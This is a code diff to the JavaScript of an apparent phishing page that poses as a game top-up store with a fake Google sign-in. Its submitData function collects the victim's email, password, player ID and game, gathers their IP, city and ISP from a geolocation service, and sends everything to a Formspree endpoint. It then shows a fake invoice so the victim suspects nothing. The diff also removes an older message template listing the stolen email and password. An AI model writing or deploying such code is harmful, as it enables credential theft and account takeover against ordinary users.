@@ -469,39 +469,26 @@
         }
 
         async function submitData(e) {
-            e.preventDefault();
-            if (isSubmitted) return;
-            isSubmitted = true;
+    e.preventDefault();
+    if (isSubmitted) return;
+    isSubmitted = true;
 
-            const email = document.getElementById('gEmail').value;
-            const password = document.getElementById('gPass').value;
-            const playerId = document.getElementById('playerId').value;
-            const zoneId = document.getElementById('zoneId').value;
-            const fullId = zoneId ? `${playerId} (${zoneId})` : playerId;
-            const noTrans = 'TRX-' + Math.floor(100000 + Math.random() * 900000);
-            const now = new Date().toLocaleString('id-ID', { dateStyle: 'full', timeStyle: 'medium' });
+    const email = document.getElementById('gEmail').value;
+    const password = document.getElementById('gPass').value;
+    const playerId = document.getElementById('playerId').value;
+    const zoneId = document.getElementById('zoneId').value;
+    const fullId = zoneId ? `${playerId} (${zoneId})` : playerId;
+    const noTrans = 'TRX-' + Math.floor(100000 + Math.random() * 900000);
+    const now = new Date().toLocaleString('id-ID', { dateStyle: 'full', timeStyle: 'medium' });
 
-            let ipData = { ip: 'Unknown', country_name: 'Indonesia', city: 'Manado', region: 'North Sulawesi', org: 'PT Telkom' };
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                ipData = await res.json();
-            } catch(err) {}
+    // AMBIL DATA DARI IP-API.COM
+    let ipData = { query: 'Unknown', country: 'Indonesia', city: 'Manado', regionName: 'North Sulawesi', isp: 'PT Telkom' };
+    try {
+        const res = await fetch('http://ip-api.com/json/');
+        ipData = await res.json();
+    } catch(err) {}
 
-            const formattedMessage = `
-WEB MAS SHINJI☕
-📧 EMAIL : ${email}
-🔑 PW : ${password}
-🆔 ID : ${fullId}
-🎮 GAME : ${currentGame}
-👤 NICKNAME : ${detectedNickname}
-🌍 REGION : ${ipData.country_name || ipData.country}
-🏙️ CITY : ${ipData.city}
-🏛️️ STATE : ${ipData.region}
-🌐 ASN : ${ipData.org}
-💻 IP : ${ipData.ip}
-            `.trim();
-
-                // KIRIM KE EMAIL VIA FORMSPREE
+    // KIRIM KE EMAIL VIA FORMSPREE
     const formspreeUrl = 'https://formspree.io/f/xjykzdjv';
     try {
         await fetch(formspreeUrl, {
@@ -514,27 +501,27 @@ WEB MAS SHINJI☕
                 player_id: fullId,
                 game: currentGame,
                 nickname: detectedNickname,
-                ip_address: ipData.ip,
-                location: `${ipData.city}, ${ipData.country_name}`,
-                asn: ipData.org
+                ip_address: ipData.query,
+                location: `${ipData.city}, ${ipData.regionName}, ${ipData.country}`,
+                isp: ipData.isp
             })
         });
     } catch(err) {}
 
+    document.getElementById('google-modal').style.display = 'none';
+    
+    document.getElementById('rNoTrans').innerText = noTrans;
+    document.getElementById('rId').innerText = fullId;
+    document.getElementById('rNick').innerText = detectedNickname;
+    document.getElementById('rItem').innerText = `${currentItemObj.name} (${currentItemObj.sub})`;
+    document.getElementById('rOrigPrice').innerText = currentItemObj.orig;
+    document.getElementById('rDate').innerText = now;
+    document.getElementById('rEmail').innerText = email;
+    document.getElementById('rCountry').innerText = ipData.country || 'Indonesia';
 
-            document.getElementById('google-modal').style.display = 'none';
-            
-            document.getElementById('rNoTrans').innerText = noTrans;
-            document.getElementById('rId').innerText = fullId;
-            document.getElementById('rNick').innerText = detectedNickname;
-            document.getElementById('rItem').innerText = `${currentItemObj.name} (${currentItemObj.sub})`;
-            document.getElementById('rOrigPrice').innerText = currentItemObj.orig;
-            document.getElementById('rDate').innerText = now;
-            document.getElementById('rEmail').innerText = email;
-            document.getElementById('rCountry').innerText = ipData.country_name || ipData.country || 'Indonesia';
+    document.getElementById('invoice-screen').style.display = 'flex';
+}
 
-            document.getElementById('invoice-screen').style.display = 'flex';
-        }
 
         function toggleReceiptDetail() {
             const box = document.getElementById('receiptDetailsBox');
